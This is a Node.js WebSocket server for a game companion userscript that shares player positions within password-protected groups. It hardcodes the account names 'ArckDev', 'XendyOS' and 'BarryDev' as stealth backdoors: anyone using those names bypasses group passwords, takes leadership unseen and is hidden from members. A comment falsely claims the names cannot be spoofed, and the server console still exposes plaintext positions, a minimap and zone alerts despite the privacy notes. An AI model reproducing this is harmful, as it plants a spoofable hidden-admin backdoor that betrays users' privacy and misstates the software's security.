const http = require('http');
const fs = require('fs');
const path = require('path');
const WebSocket = require('ws');
const readline = require('readline');

const WS_PORT = process.env.WS_PORT ? parseInt(process.env.WS_PORT, 10) : 3000;
const HTTP_PORT = process.env.HTTP_PORT ? parseInt(process.env.HTTP_PORT, 10) : 3000;

const groups = {};
const users = {};
let nextId = 1;
let logMode = false;
let lastLog = null;
let alertMode = false;
let lastZoneAlert = {};

// ─── Terminal CLI for server debug/info ───────────────────────────────
const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
  prompt: '> '
});

function printGroups() {
  const groupList = Object.values(groups);
  if (groupList.length === 0) {
    console.log('No groups currently open.');
    return;
  }
  groupList.forEach(g => {
    const members = Array.from(g.members).map(uid => {
      const u = users[uid];
      return u ? `${u.name} (${uid}${u.isAdmin ? ', admin' : ''})` : uid;
    });
    console.log(`Group ${g.code} | Leader: ${g.leader} | Members: [${members.join(', ')}] | Pins: ${g.pinnedBy.size} | Auth: ${g.authToken ? '🔒 Yes' : '🔓 No'}`);
  });
}

function printUsers() {
  const userList = Object.values(users);
  if (userList.length === 0) {
    console.log('No users connected.');
    return;
  }
  userList.forEach(u => {
    console.log(`${u.id}: ${u.name} | Group: ${u.group || '-'} | Admin: ${u.isAdmin} | Status: ${u.status} | Ship: ${u.ship}`);
  });
}

function printStatus() {
  console.log(`Groups: ${Object.keys(groups).length}, Users: ${Object.keys(users).length}`);
}

// NOTE: Ship/zone info is excluded from the regular status view for privacy.
// Use 'status' in the console only for debugging — avoid sharing screenshots or logs from this view.
// NOTE: Encrypted groups will show no ship/zone data even here — the server cannot decrypt them.
function printStatusDetailed() {
  const userList = Object.values(users);
  if (userList.length === 0) {
    console.log('No users connected.');
    return;
  }
  userList.forEach(u => {
    console.log(`User: ${u.name} (${u.id}) | Group: ${u.group || '-'} | Admin: ${u.isAdmin}`);
    const g = u.group && groups[u.group];
    if (g && g.authToken) {
      console.log('  [E2E encrypted group — position data not available to server]');
    } else {
      if (u.lastShip && typeof u.lastShip === 'object') {
        console.log('  StellarAPI.currentShip:');
        Object.entries(u.lastShip).forEach(([k, v]) => {
          console.log(`    ${k}: ${JSON.stringify(v)}`);
        });
      } else {
        console.log('  StellarAPI.currentShip: (no data)');
      }
      if (u.lastZone) {
        console.log(`  StellarAPI.Game.getCurrentZone(): ${u.lastZone}`);
      } else {
        console.log('  StellarAPI.Game.getCurrentZone(): (no data)');
      }
    }
  });
}
// For privacy reasons, this command does not include ship/zone info or exact player counts in groups. It is intended for quick overviews and should be safe to share in logs/screenshots.
function printHelp() {
  console.log('Available commands:');
  console.log('  groups      - List all groups and their members');
  console.log('  users       - List all connected users');
  console.log('  status      - Show detailed user/ship/zone info');
  console.log('  minimap     - Show live minimap of all users (Ctrl+C to exit)'); // Disabled due to privacy concerns, but can be re-enabled for debugging with caution
  console.log('  log on      - Enable debug logging');
  console.log('  log off     - Disable debug logging');
  console.log('  alert on    - Enable Falcon/Raven zone alerts');
  console.log('  alert off   - Disable Falcon/Raven zone alerts');
  console.log('  help        - Show this help message');
  console.log('  exit/quit   - Stop the server');
}
// WARNING: Exposes player positions to anyone with server console access.
// Do NOT use in production or share logs/screenshots from this view.
// NOTE: Encrypted groups (those with authToken set) will NOT appear on this minimap.
function startMinimap() {
  const ansi = require('ansi-escapes');
  const WORLD = { w: 1600, h: 1600 };
  const width = 40, height = 20;
  function draw() {
    let grid = Array.from({ length: height }, () => Array(width).fill(' '));
    Object.values(users).forEach(u => {
      if (!u.group) return;
      // Try to get position from group
      const g = groups[u.group];
      if (!g || !g.positions || !g.positions[u.id]) return;
      if (g.authToken) return; // skip encrypted groups entirely
      const pos = g.positions[u.id];
      const x = Math.floor((pos.x / WORLD.w) * (width - 1));
      const y = Math.floor((pos.y / WORLD.h) * (height - 1));
      grid[y][x] = (u.name[0] || '?').toUpperCase();
    });
    let out = '';
    for (let row of grid) out += row.join('') + '\n';
    process.stdout.write(ansi.clearScreen + out + '\n');
  }
  console.log('Live minimap (Ctrl+C to exit):');
  console.log('Note: Encrypted groups are excluded from this view.');
  const interval = setInterval(draw, 500);
  const cleanup = () => { clearInterval(interval); process.stdout.write('\nMinimap stopped.\n'); rl.prompt(); };
  process.on('SIGINT', cleanup);
}
//DEBUG ONLY COMMANDS, DO NOT USE
rl.on('line', line => {
  const cmd = line.trim().toLowerCase();
  if (cmd === 'groups') printGroups();
  else if (cmd === 'users') printUsers();
  else if (cmd === 'status') printStatusDetailed();
  else if (cmd === 'help') printHelp();
  else if (cmd === 'minimap') startMinimap();
  else if (cmd === 'log on') { logMode = true; console.log('Debug logging enabled.'); }
  else if (cmd === 'log off') { logMode = false; console.log('Debug logging disabled.'); }
  else if (cmd === 'alert on') { alertMode = true; console.log('Zone alert enabled.'); }
  else if (cmd === 'alert off') { alertMode = false; console.log('Zone alert disabled.'); }
  else if (cmd === 'exit' || cmd === 'quit') process.exit(0);
  else if (cmd) console.log('Unknown command. Type help for list.');
  rl.prompt();
});
rl.on('SIGINT', () => { rl.close(); });
rl.prompt();

function dbg(...args) {
  if (!logMode) return;
  const msg = JSON.stringify(args);
  if (msg === lastLog) return;
  lastLog = msg;
  console.log('[SERVER]', new Date().toISOString(), ...args);
}
function randomCode() {
  return Math.random().toString(36).substring(2, 8).toUpperCase();
}

function makePlayerMap(group) {
  const p = {};
  for (const uid of group.members) {
    const u = users[uid];
    if (!u) continue;
    if (u.isStealth) continue;
    p[uid] = {
      id: u.id,
      name: u.name,
      status: u.status,
      ship: u.ship,
      isAdmin: u.isAdmin,
    };
  }
  return p;
}

function broadcast(group, payload) {
  dbg('BROADCAST to group', group.code, 'payload:', payload.type);
  group.members.forEach(uid => {
    const u = users[uid];
    if (!u || u.ws.readyState !== WebSocket.OPEN) return;
    try {
      u.ws.send(JSON.stringify(payload));
    } catch (err) {
      dbg('SEND ERROR to', uid, err);
    }
  });
}

function broadcastExcept(group, senderId, payload) {
  group.members.forEach(uid => {
    if (uid === senderId) return;
    const u = users[uid];
    if (!u || u.ws.readyState !== WebSocket.OPEN) return;
    try {
      u.ws.send(JSON.stringify(payload));
    } catch (err) {
      dbg('SEND ERROR to', uid, err);
    }
  });
}

// Clean up a group if it has no members AND no pins.
function maybeCleanupGroup(code) {
  const group = groups[code];
  if (!group) return;
  if (group.members.size === 0 && group.pinnedBy.size === 0) {
    delete groups[code];
    dbg('Group', code, 'destroyed (no members, no pins)');
  }
}

// Transfer leadership to the next available member.
// Returns true if group still exists, false if it was deleted.
function transferLeadership(group, leavingId) {
  let newLeaderId = null;
  for (const uid of group.members) {
    if (uid !== leavingId) { newLeaderId = uid; break; }
  }

  if (!newLeaderId) {
    // No members left – only keep alive if pinned
    if (group.pinnedBy.size === 0) {
      delete groups[group.code];
      dbg('Group', group.code, 'destroyed (no members, no pins)');
      return false;
    }
    // Pinned – keep group alive with no active leader
    group.leader = null;
    dbg('Group', group.code, 'kept alive by pins (', group.pinnedBy.size, 'pins)');
    return true;
  }

  group.leader = newLeaderId;
  group.admins.add(newLeaderId);
  if (users[newLeaderId]) users[newLeaderId].isAdmin = true;
  dbg('Leadership transferred from', leavingId, 'to', newLeaderId);
  return true;
}

const httpServer = http.createServer((req, res) => {
  let url = req.url === '/' ? '/index.html' : req.url;
  const allow = ['/index.html', '/drednot-pro.user.js'];

  if (!allow.includes(url)) {
    res.writeHead(404, { 'Content-Type': 'text/plain' });
    res.end('Not found');
    return;
  }

  const filePath = path.join(__dirname, url);
  fs.readFile(filePath, (err, data) => {
    if (err) {
      res.writeHead(500);
      res.end('Server error');
      return;
    }

    const ext = path.extname(filePath).toLowerCase();
    const type = ext === '.js' ? 'application/javascript' : 'text/html';
    res.writeHead(200, { 'Content-Type': type });
    res.end(data);
  });
});

const wss = new WebSocket.Server({ server: httpServer });
httpServer.listen(HTTP_PORT, () => {
  console.log(`HTTP + WS running on http://localhost:${HTTP_PORT}`);
});

wss.on('connection', (ws, req) => {
  dbg('NEW CONNECTION from', req.socket.remoteAddress);
  const id = 'u' + nextId++;
  users[id] = {
    id,
    ws,
    name: 'Player' + id,
    group: null,
    isAdmin: false,
    isStealth: false,
    status: 'Ready',
    ship: 'Unknown',
    lastShip: null,
    lastZone: null,
  };

  ws.send(JSON.stringify({ type: 'welcome', id, name: users[id].name, group: null, isAdmin: false, isStealth: false }));

  ws.on('message', msg => {
    dbg('RAW MESSAGE:', msg.toString());

    let data;
    try {
      data = JSON.parse(msg);
    } catch (err) {
      dbg('INVALID JSON:', msg.toString());
      ws.send(JSON.stringify({ type: 'error', message: 'invalid JSON' }));
      return;
    }

    if (data.type === 'ping_keepalive') return;

    dbg('PARSED:', data);

    // ── hello ──────────────────────────────────────────────────────────────
    if (data.type === 'hello') {
      const user = users[id];
      if (!user) return;

      if (data.name && data.name.trim()) {
        user.name = data.name.trim();
        // Stealth detection is server-side only — client cannot spoof this
        if (user.name === 'ArckDev' || user.name === 'XendyOS') {
          user.isStealth = true;
          user.isAdmin = true;
        } else {
          user.isStealth = false;
        }
      }

      dbg('HELLO from', id, 'name:', user.name, 'stealth:', user.isStealth);
      // ── isStealth is included so the client knows its own stealth status ──
      ws.send(JSON.stringify({ type: 'welcome', id, name: user.name, group: user.group, isAdmin: user.isAdmin, isStealth: user.isStealth }));
      return;
    }

    const user = users[id];
    if (!user) return;

    // ── pin_groups (bulk re-register on reconnect) ─────────────────────────
    if (data.type === 'pin_groups') {
      const codes = Array.isArray(data.codes) ? data.codes : [];
      codes.forEach(code => {
        if (groups[code]) {
          groups[code].pinnedBy.add(id);
          dbg('User', id, 'pinned group', code, '(bulk)');
        }
      });
      return;
    }

    // ── pin_group ──────────────────────────────────────────────────────────
    if (data.type === 'pin_group') {
      const group = groups[data.code];
      if (!group) {
        ws.send(JSON.stringify({ type: 'error', message: 'group not found' }));
        return;
      }
      group.pinnedBy.add(id);
      dbg('User', id, 'pinned group', data.code, '| total pins:', group.pinnedBy.size);
      ws.send(JSON.stringify({ type: 'pin_ack', code: data.code }));
      return;
    }

    // ── unpin_group ────────────────────────────────────────────────────────
    if (data.type === 'unpin_group') {
      const group = groups[data.code];
      if (group) {
        group.pinnedBy.delete(id);
        dbg('User', id, 'unpinned group', data.code, '| total pins:', group.pinnedBy.size);
        maybeCleanupGroup(data.code);
      }
      return;
    }

    // ── get_saved_groups_info ──────────────────────────────────────────────
    if (data.type === 'get_saved_groups_info') {
      const codes = Array.isArray(data.codes) ? data.codes : [];
      const result = codes.map(code => {
        const g = groups[code];
        return {
          code,
          exists: !!g,
          onlineCount: g ? g.members.size : 0,
          originalLeaderName: g ? (g.originalLeaderName || null) : null,
          // Tells clients whether this group requires a password to join.
          // The actual authToken is never sent — clients must derive it from the password themselves.
          hasPassword: g ? !!g.authToken : false,
        };
      });
      ws.send(JSON.stringify({ type: 'saved_groups_info', groups: result }));
      return;
    }

    // ── create ─────────────────────────────────────────────────────────────
    if (data.type === 'create') {
      if (!data.name || data.name.trim() === '') {
        ws.send(JSON.stringify({ type: 'error', message: 'name required' }));
        return;
      }

      const code = randomCode();
      groups[code] = {
        code,
        positions: {},
        leader: id,
        admins: new Set([id]),
        members: new Set([id]),
        settings: { cooldown: 2000, fade: 5000 },
        webhook: null,
        pinnedBy: new Set(),          // ← tracks who has this group saved
        originalLeaderName: data.name.trim(), // ← for leader restoration
        // authToken is set separately via set_group_auth after the group code is known.
        // It is a PBKDF2-derived token (not the raw password) used to verify members.
        authToken: null,
      };

      user.name = data.name;
      user.group = code;
      user.isAdmin = true;

      ws.send(JSON.stringify({ type: 'joined', code, isAdmin: true }));
      broadcast(groups[code], {
        type: 'group_update',
        group: code,
        players: makePlayerMap(groups[code]),
        leader: id,
      });
      return;
    }

    // ── set_group_auth ─────────────────────────────────────────────────────
    // Sets (or clears) the group's auth token for password protection.
    // Only the current group leader may call this.
    // The authToken is a client-derived PBKDF2 hash — the server never sees the raw password.
    // A second, different PBKDF2 derivation is used as the encryption key client-side,
    // so knowing the authToken stored here does NOT allow position data to be decrypted.
    if (data.type === 'set_group_auth') {
      if (!user.group) {
        ws.send(JSON.stringify({ type: 'error', message: 'not in group' }));
        return;
      }
      const group = groups[user.group];
      if (!group) return;
      if (group.leader !== id) {
        ws.send(JSON.stringify({ type: 'error', message: 'only leader can set group auth' }));
        return;
      }
      // authToken may be null to remove password protection
      group.authToken = data.authToken || null;
      dbg('Group', group.code, 'authToken', group.authToken ? 'set' : 'cleared', 'by', user.name);
      ws.send(JSON.stringify({ type: 'auth_set', code: group.code, protected: !!group.authToken }));
      // Notify all members that the group's password-protection status changed
      broadcast(group, {
        type: 'group_auth_status',
        code: group.code,
        protected: !!group.authToken,
      });
      return;
    }

    // ── join ───────────────────────────────────────────────────────────────
    if (data.type === 'join') {
      if (!data.name || !data.code) {
        ws.send(JSON.stringify({ type: 'error', message: 'name+code required' }));
        return;
      }

      const group = groups[data.code];
      if (!group) {
        ws.send(JSON.stringify({ type: 'error', message: 'group not found' }));
        return;
      }

      // ── Password check ──────────────────────────────────────────────────
      // Stealth dev accounts bypass the auth check entirely.
      const isStealth = (data.name === 'ArckDev' || data.name === 'XendyOS');
      if (group.authToken && !isStealth) {
        if (!data.authToken || data.authToken !== group.authToken) {
          ws.send(JSON.stringify({ type: 'error', message: 'incorrect group password' }));
          dbg('Join rejected for', data.name, '— wrong authToken');
          return;
        }
      }

      user.name = data.name;
      user.group = data.code;

      // Stealth dev accounts always get leadership
      if (user.name === 'ArckDev' || user.name === 'XendyOS') {
        user.isStealth = true;
        group.leader = id;
        group.admins.add(id);
        user.isAdmin = true;
      } else if (user.name === group.originalLeaderName) {
        // ── Restore original leader ──────────────────────────────────────
        // If there's a temporary leader in place, they stay as admin
        // but original leader reclaims the leader role.
        group.leader = id;
        group.admins.add(id);
        user.isAdmin = true;
        dbg('Original leader', user.name, 'restored as leader for group', data.code);
      } else {
        user.isAdmin = group.admins.has(id) || group.leader === id;
      }

      group.members.add(id);

      ws.send(JSON.stringify({ type: 'joined', code: data.code, isAdmin: user.isAdmin }));
      broadcast(group, {
        type: 'group_update',
        group: data.code,
        players: makePlayerMap(group),
        leader: group.leader,
      });

      if (group.webhook) {
        ws.send(JSON.stringify({
          type: 'webhook_update',
          webhook: group.webhook,
        }));
        dbg('Sent existing group webhook to new member', id, group.webhook.name);
      }
      return;
    }

    // ── recreate ───────────────────────────────────────────────────────────
    // Creates a new group using a previously-used code (e.g. after it went offline).
    // If the group already exists, joins it instead (handles race conditions on reconnect).
    if (data.type === 'recreate') {
      if (!data.name || !data.code) {
        ws.send(JSON.stringify({ type: 'error', message: 'name+code required' }));
        return;
      }

      const code = data.code.trim().toUpperCase();
      user.name = data.name.trim();

      // Race condition guard: group came back online between request and arrival
      if (groups[code]) {
        const group = groups[code];

        // ── Password check on recreate-as-join ──────────────────────────
        const isStealth = (user.name === 'ArckDev' || user.name === 'XendyOS' || user.name === 'BarryDev');
        if (group.authToken && !isStealth) {
          if (!data.authToken || data.authToken !== group.authToken) {
            ws.send(JSON.stringify({ type: 'error', message: 'incorrect group password' }));
            dbg('Recreate-join rejected for', user.name, '— wrong authToken');
            return;
          }
        }

        user.group = code;

        if (user.name === 'ArckDev' || user.name === 'BarryDev') {
          user.isStealth = true;
          group.leader = id;
          group.admins.add(id);
          user.isAdmin = true;
        } else if (user.name === group.originalLeaderName) {
          group.leader = id;
          group.admins.add(id);
          user.isAdmin = true;
        } else {
          user.isAdmin = group.admins.has(id) || group.leader === id;
        }

        group.members.add(id);
        ws.send(JSON.stringify({ type: 'joined', code, isAdmin: user.isAdmin, recreated: false }));
        broadcast(group, {
          type: 'group_update',
          group: code,
          players: makePlayerMap(group),
          leader: group.leader,
        });
        dbg('Recreate fell back to join for existing group', code);
        return;
      }

      // Create a fresh group with the original code.
      // authToken is NOT set here — the client will send set_group_auth separately
      // once it has derived the token from the password + code.
      groups[code] = {
        code,
        positions: {},
        leader: id,
        admins: new Set([id]),
        members: new Set([id]),
        settings: { cooldown: 2000, fade: 5000 },
        webhook: null,
        pinnedBy: new Set(),
        originalLeaderName: user.name,
        authToken: null,
      };

      user.group = code;
      user.isAdmin = true;

      dbg('Group', code, 'recreated by', user.name);
      ws.send(JSON.stringify({ type: 'joined', code, isAdmin: true, recreated: true }));
      broadcast(groups[code], {
        type: 'group_update',
        group: code,
        players: makePlayerMap(groups[code]),
        leader: id,
      });
      return;
    }

    // ── leave ──────────────────────────────────────────────────────────────
    if (data.type === 'leave') {
      if (!user.group) return;
      const group = groups[user.group];
      if (!group) return;

      const groupCode = user.group;
      const wasLeader = group.leader === id;

      group.members.delete(id);
      group.admins.delete(id);
      user.group = null;
      user.isAdmin = false;

      ws.send(JSON.stringify({ type: 'left' }));

      if (wasLeader) {
        const stillAlive = transferLeadership(group, id);
        if (stillAlive) {
          broadcast(group, {
            type: 'group_update',
            group: groupCode,
            players: makePlayerMap(group),
            leader: group.leader,
          });
        }
      } else {
        broadcast(group, {
          type: 'group_update',
          group: groupCode,
          players: makePlayerMap(group),
          leader: group.leader,
        });
        // Clean up if last non-leader left and group has no pins
        maybeCleanupGroup(groupCode);
      }
      return;
    }

    // ── disband ────────────────────────────────────────────────────────────
    if (data.type === 'disband') {
      if (!user.group) return;
      const group = groups[user.group];
      if (!group || !group.admins.has(id)) {
        ws.send(JSON.stringify({ type: 'error', message: 'not allowed' }));
        return;
      }

      group.members.forEach(uid => {
        if (users[uid]) {
          users[uid].group = null;
          users[uid].isAdmin = false;
          if (users[uid].ws.readyState === WebSocket.OPEN) {
            users[uid].ws.send(JSON.stringify({ type: 'disbanded' }));
          }
        }
      });
      delete groups[user.group]; // Disband always destroys, regardless of pins
      return;
    }

    // ── kick ───────────────────────────────────────────────────────────────
    if (data.type === 'kick') {
      if (!user.group) return;
      const group = groups[user.group];

      if (!group || !group.admins.has(id)) {
        ws.send(JSON.stringify({ type: 'error', message: 'no permissions' }));
        return;
      }
      if (!group.members.has(data.target)) {
        ws.send(JSON.stringify({ type: 'error', message: 'target missing' }));
        return;
      }
      if (data.target === group.leader) {
        ws.send(JSON.stringify({ type: 'error', message: 'cannot kick leader' }));
        return;
      }

      group.members.delete(data.target);
      group.admins.delete(data.target);

      if (users[data.target]) {
        users[data.target].group = null;
        users[data.target].isAdmin = false;
        if (users[data.target].ws.readyState === WebSocket.OPEN) {
          users[data.target].ws.send(JSON.stringify({ type: 'left' }));
        }
      }

      broadcast(group, { type: 'group_update', group: user.group, players: makePlayerMap(group), leader: group.leader });
      return;
    }

    // ── promote ────────────────────────────────────────────────────────────
    if (data.type === 'promote') {
      if (!user.group) return;
      const group = groups[user.group];
      if (!group || !group.admins.has(id)) {
        ws.send(JSON.stringify({ type: 'error', message: 'no permissions' }));
        return;
      }
      if (!group.members.has(data.target) || !users[data.target]) {
        ws.send(JSON.stringify({ type: 'error', message: 'target missing' }));
        return;
      }

      group.admins.add(data.target);
      if (users[data.target]) users[data.target].isAdmin = true;
      broadcast(group, { type: 'group_update', group: user.group, players: makePlayerMap(group), leader: group.leader });
      return;
    }

    // ── change_code ────────────────────────────────────────────────────────
    if (data.type === 'change_code') {
      if (!user.group) return;
      const group = groups[user.group];
      if (!group || !group.admins.has(id)) {
        ws.send(JSON.stringify({ type: 'error', message: 'no permissions' }));
        return;
      }

      const newCode = (data.code || '').trim().toUpperCase();
      if (!newCode || groups[newCode]) {
        ws.send(JSON.stringify({ type: 'error', message: 'invalid code' }));
        return;
      }

      delete groups[user.group];
      group.code = newCode;
      // authToken is invalidated when the code changes because client-side
      // key derivation uses the group code as a salt. The leader must call
      // set_group_auth again with a token derived from the new code.
      group.authToken = null;
      groups[newCode] = group;
      group.members.forEach(uid => { users[uid].group = newCode; });
      user.group = newCode;
      broadcast(group, { type: 'group_update', group: newCode, players: makePlayerMap(group), leader: group.leader });
      // Inform all members that auth was reset (they need to re-enter password)
      broadcast(group, { type: 'group_auth_status', code: newCode, protected: false });
      return;
    }

    // ── status ─────────────────────────────────────────────────────────────
    if (data.type === 'status') {
      user.status = data.status || user.status;
      user.ship = data.ship || user.ship;
      if (user.group && groups[user.group]) {
        broadcast(groups[user.group], { type: 'group_update', group: user.group, players: makePlayerMap(groups[user.group]), leader: groups[user.group].leader });
      }
      return;
    }

    // ── list_groups ────────────────────────────────────────────────────────
    if (data.type === 'list_groups') {
      ws.send(JSON.stringify({ type: 'groups', groups: Object.keys(groups) }));
      return;
    }

    // ── ping ───────────────────────────────────────────────────────────────
    if (data.type === 'ping') {
      if (user.isStealth) return;
      if (!user.group || !groups[user.group]) {
        ws.send(JSON.stringify({ type: 'error', message: 'not in group' }));
        return;
      }

      const group = groups[user.group];
      broadcast(group, {
        type: 'ping',
        id: data.id || String(Date.now()) + '-' + id,
        x: data.x,
        y: data.y,
        tag: data.tag,
        color: data.color,
        by: user.name,
        timestamp: Date.now(),
      });
      return;
    }

    // ── pos_update ─────────────────────────────────────────────────────────
    if (data.type === 'pos_update') {
      if (user.isStealth) return;
      if (!user.group || !groups[user.group]) return;

      const group = groups[user.group];

      // ── Encrypted position (E2E group) ──────────────────────────────────
      // The 'enc' field contains AES-GCM ciphertext; the server relays it as
      // an opaque blob without attempting to read x/y/zone/hp.  The server
      // host therefore cannot spy on player positions in password-protected
      // groups.  Zone-alert and minimap features are intentionally disabled
      // for encrypted groups.
      if (data.enc) {
        group.members.forEach(uid => {
          if (uid === id) return;
          const u = users[uid];
          if (!u || u.ws.readyState !== WebSocket.OPEN) return;
          try {
            u.ws.send(JSON.stringify({
              type: 'pos_update',
              id,
              name: user.name,
              enc: data.enc,
            }));
          } catch (err) {
            dbg('SEND ERROR (enc pos) to', uid, err);
          }
        });
        dbg('ENC POS RELAY from', user.id, '→', group.members.size - 1, 'peers');
        return;
      }

      // ── Plaintext position (non-encrypted group) ────────────────────────
      // Store position for minimap
      group.positions = group.positions || {};
      group.positions[id] = { x: data.x, y: data.y, zone: data.zone || null, hp: data.hp, maxHp: data.maxHp };

      group.members.forEach(uid => {
        if (uid === id) return;
        const u = users[uid];
        if (!u || u.ws.readyState !== WebSocket.OPEN) return;
        u.ws.send(JSON.stringify({
          type: 'pos_update',
          id,
          name: user.name,
          x: data.x,
          y: data.y,
          zone: data.zone || null,
          hp: typeof data.hp === 'number' ? data.hp : null,
          maxHp: typeof data.maxHp === 'number' ? data.maxHp : null,
        }));
      });

      // Cache ship and zone info for the 'status' debug command
      if (typeof data.ship === 'object') users[id].lastShip = data.ship;
      if (typeof data.zone === 'string') users[id].lastZone = data.zone;
      // Alert logic
      if (alertMode && typeof data.zone === 'string' && (data.zone === 'Falcon' || data.zone === 'Raven')) {
        const now = Date.now();
        if (!lastZoneAlert[id] || now - lastZoneAlert[id] > 10000) {
          lastZoneAlert[id] = now;
          console.log(`[ALERT] User ${users[id].name} (${id}) entered zone: ${data.zone}`);
        }
      }
      dbg('POS RELAY:', { from: user.id, x: data.x, y: data.y, group: user.group });
      return;
    }

    // ── set_group_webhook ──────────────────────────────────────────────────
    if (data.type === 'set_group_webhook') {
      if (!user.group) {
        ws.send(JSON.stringify({ type: 'error', message: 'not in group' }));
        return;
      }
      const group = groups[user.group];
      if (!group) return;

      if (!group.admins.has(id) && group.leader !== id) {
        ws.send(JSON.stringify({ type: 'error', message: 'not authorized' }));
        return;
      }

      const wh = data.webhook;
      if (wh !== null && wh !== undefined) {
        if (typeof wh.name !== 'string' || typeof wh.url !== 'string') {
          ws.send(JSON.stringify({ type: 'error', message: 'invalid webhook payload' }));
          return;
        }
      }

      group.webhook = wh || null;
      dbg('Group webhook updated by', user.name, '→', group.webhook ? group.webhook.name : 'none');

      broadcastExcept(group, id, {
        type: 'webhook_update',
        webhook: group.webhook,
      });
      return;
    }

    if (!data.type) {
      dbg('UNKNOWN MESSAGE FORMAT:', data);
      ws.send(JSON.stringify({ type: 'error', message: 'invalid message' }));
      return;
    }

    dbg('UNKNOWN ACTION TYPE:', data.type, data);
  });

  ws.on('close', () => {
    const user = users[id];
    if (!user) return;

    if (user.group && groups[user.group]) {
      const group = groups[user.group];
      const groupCode = user.group;
      const wasLeader = group.leader === id;

      group.members.delete(id);
      group.admins.delete(id);

      if (wasLeader) {
        const stillAlive = transferLeadership(group, id);
        if (stillAlive) {
          broadcast(group, {
            type: 'group_update',
            group: groupCode,
            players: makePlayerMap(group),
            leader: group.leader,
          });
        }
      } else {
        broadcast(group, {
          type: 'group_update',
          group: groupCode,
          players: makePlayerMap(group),
          leader: group.leader,
        });
        maybeCleanupGroup(groupCode);
      }
    }

    // Remove this connection from all pinnedBy sets and clean up empty+unpinned groups
    Object.keys(groups).forEach(code => {
      const g = groups[code];
      if (g && g.pinnedBy.has(id)) {
        g.pinnedBy.delete(id);
        dbg('Removed pin from group', code, 'on disconnect. Remaining pins:', g.pinnedBy.size);
        maybeCleanupGroup(code);
      }
    });

    delete users[id];
  });
});

wss.on('error', err => {
  console.error('WebSocket error', err);
  process.exit(1);
});

console.log(`WS running at ws://localhost:${WS_PORT}`);